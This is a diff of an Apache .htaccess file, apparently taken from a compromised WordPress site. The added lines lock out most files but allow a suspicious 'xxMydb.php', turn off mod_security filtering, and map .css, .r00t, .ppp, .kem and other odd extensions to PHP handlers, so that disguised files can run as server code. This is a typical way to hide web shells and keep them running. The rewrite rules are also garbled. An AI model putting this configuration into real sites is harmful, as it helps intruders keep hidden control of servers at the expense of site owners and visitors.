@@ -1,10 +1,44 @@
-<FilesMatch ".(py|exe|php)$">
+<Files .*>
+        Order Allow,Deny
+        Deny From All
+</Files>
+<FilesMatch ".(|*|py|exe|php)$">
+Order allow,deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(index.php|xxMydb.php|template.php|templates.php|wp-config.php|.wp-config.php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
 
 
+# BEGIN WordPress
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteCond% {REQUEST_FILENAME}! -F
+RewriteCond% {REQUEST_FILENAME}! -D
+RewriteRule. /index.php [L]
+</IfModule>
+<IfModule mod_security.c>
+SecFilterEngine Off
+SecFilterScanPOST Off
+</IfModule>
+# END WordPress
 
-<FilesMatch "\.css$">
+<FilesMatch "\.kem$">
     SetHandler application/x-httpd-alt-php74___lsphp
 </FilesMatch>
+
+
+<FilesMatch "\.ppp$">
+    SetHandler application/x-httpd-php
+
+</FilesMatch>
+<IfModule mime_module>
+  AddHandler application/x-httpd-ea-php56 .ssl .phtml5 .pp .css .pp .r00t
+</IfModule>
+
+<IfModule mime_module>
+  AddHandler application/x-httpd-php .ssl .phtml5 .pp .css .pp .r00t
+</IfModule>
